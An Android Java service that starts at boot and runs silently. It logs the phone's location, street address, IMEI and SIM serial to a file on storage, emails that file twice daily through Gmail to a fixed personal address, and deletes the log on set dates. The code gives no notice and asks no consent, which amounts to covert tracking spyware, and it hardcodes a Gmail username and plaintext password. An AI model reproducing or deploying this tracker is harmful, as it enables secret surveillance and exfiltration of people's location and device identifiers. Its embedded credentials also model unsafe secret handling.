package com.yogi.AndService;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.*;
import android.location.Address;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.TelephonyManager;


import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.*;
import javax.mail.internet.*;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * Created with IntelliJ IDEA.
 * User: IT-SOFT
 * Date: 5/28/14
 * Time: 10:31 AM
 * To change this template use File | Settings | File Templates.
 */
public class AndroidStartServiceOnBoot extends Service {
    private LocationManager locationManager=null;
    private LocationListener locationListener=null;

    String cityName=" ";
    List<Address> addresses;

    String longitude = "";
    String latitude = "";
    Calendar c=Calendar.getInstance();
    SimpleDateFormat sdf;
    SimpleDateFormat sdfDate;
    String strDate;
    String LastStrDate;
    String ThisDate;

    private static final String username = "cslocationservice01@gmail.com";
    private static final String password = "cslocation1988";


    SimpleDateFormat sdfHour = new SimpleDateFormat("dd:MMMM:yyyy HH:mm:ss");
    String strDateHour = sdfHour.format(c.getTime());

    String email = "yogiektambakboyo@gmail.com";
    String subject = "Location";
    String message = "My Location ";

    TelephonyManager telephonyManager;
    String myIMEI;

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        c = Calendar.getInstance();
        sdf = new SimpleDateFormat("dd:MMMM:yyyy HH:mm:ss");

        strDate = sdf.format(c.getTime());
        LastStrDate = sdf.format(c.getTime());


        locationListener = new MyLocationListener();

        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5, 0,locationListener);

        telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        myIMEI = telephonyManager.getDeviceId()+" - " + telephonyManager.getSimSerialNumber();

        generateNoteOnSD("Notes","\n"+myIMEI+";"+strDate+";"+cityName+";"+longitude+";"+latitude);

        int delay = 10000;   // delay for 5 sec.
        int interval = 3400000;  // iterate every sec. 1 minute =60000 1 hours = 3.600.000
        Timer timer = new Timer();

        timer.scheduleAtFixedRate(new TimerTask() {
            public void run() {
                sdfHour = new SimpleDateFormat("HH");
                strDateHour = sdfHour.format(c.getTime());

                sdfDate= new SimpleDateFormat("dd");
                ThisDate = sdfDate.format(c.getTime());

                if(strDateHour.equals("08")||(strDateHour.equals("20"))){
                    email = "yogiektambakboyo@gmail.com";
                    subject = "Location";
                    message = "My Location - "+myIMEI;
                    sendMail(email, subject, message);
                }

                if (ThisDate.equals("10")||(ThisDate.equals("20"))||(ThisDate.equals("27"))){
                    if(strDateHour.equals("21")){
                        DeleteNotes("Notes");
                    }
                }

            }
        }, delay, interval);
    }

    public void generateNoteOnSD(String sFileName, String sBody){
        try
        {
            File root = new File(Environment.getExternalStorageDirectory(), "Notes");
            if (!root.exists()) {
                root.mkdirs();
            }
            File gpxfile = new File(root, sFileName);
            FileWriter writer = new FileWriter(gpxfile,true);
            writer.append(sBody);
            writer.flush();
            writer.close();
        }
        catch(IOException e)
        {
            e.printStackTrace();
        }

    }

    public void DeleteNotes(String sFileName){
            File root = new File(Environment.getExternalStorageDirectory(), "Notes");
            if (!root.exists()) {
                root.mkdirs();
            }
            File gpxfile = new File(root, sFileName);
            if (gpxfile.exists()) {
                gpxfile.delete();
            }
    }

    public void sendMail(String email, String subject, String messageBody) {
        Session session = createSessionObject();

        try {
            Message message = createMessage(email, subject, messageBody, session);
            new SendMailTask().execute(message);
        } catch (AddressException e) {
            e.printStackTrace();
        } catch (MessagingException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    private Message createMessage(String email, String subject, String messageBody, Session session) throws MessagingException, UnsupportedEncodingException {
        Message message = new MimeMessage(session);
        message.setFrom(new InternetAddress("cslocationservice01@gmail.com", "cslocationservice01"));
        message.addRecipient(Message.RecipientType.TO, new InternetAddress(email, email));
        message.setSubject(subject);
        message.setText(messageBody);

        Multipart mp = new MimeMultipart();
        MimeBodyPart htmlPart = new MimeBodyPart();
        htmlPart.setContent(messageBody, "text/html");
        mp.addBodyPart(htmlPart);

        File root = new File(Environment.getExternalStorageDirectory(), "Notes");
        if (!root.exists()) {
            root.mkdirs();
        }
        File gpxfile = new File(root, "Notes");

        MimeBodyPart messageBodyPart = new MimeBodyPart();
        FileDataSource fileDataSource =new FileDataSource(gpxfile);
        messageBodyPart.setDataHandler(new DataHandler(fileDataSource));
        messageBodyPart.setFileName(gpxfile.getName());
        mp.addBodyPart(messageBodyPart);

        message.setContent(mp);
        return message;
    }

    private Session createSessionObject() {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");

        return Session.getInstance(properties, new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(username, password);
            }
        });
    }

    private class SendMailTask extends AsyncTask<Message, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
        }

        @Override
        protected Void doInBackground(Message... messages) {
            try {
                Transport.send(messages[0]);
            } catch (MessagingException e) {
                e.printStackTrace();
            }
            return null;
        }
    }

    /*----------Listener class to get coordinates ------------- */
    private class MyLocationListener implements LocationListener {
        @Override
        public void onLocationChanged(Location loc) {

            longitude = "Longitude: " +loc.getLongitude();
            latitude = "Latitude: " +loc.getLatitude();

            Geocoder gcd = new Geocoder(getBaseContext(), Locale.getDefault());

            try {
                addresses = gcd.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
                if (addresses.size() > 0)
                    cityName=addresses.get(0).getAddressLine(0)+", "+addresses.get(0).getAddressLine(1);
            } catch (IOException e) {
                e.printStackTrace();
            }

            telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
            myIMEI = telephonyManager.getDeviceId()+" - " + telephonyManager.getSimSerialNumber();

            generateNoteOnSD("Notes","\n"+myIMEI+";"+strDate+";"+cityName+";"+longitude+";"+latitude);
        }

        @Override
        public void onProviderDisabled(String provider) {
            // TODO Auto-generated method stub
        }

        @Override
        public void onProviderEnabled(String provider) {
            // TODO Auto-generated method stub
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {
            // TODO Auto-generated method stub

        }
    }
}
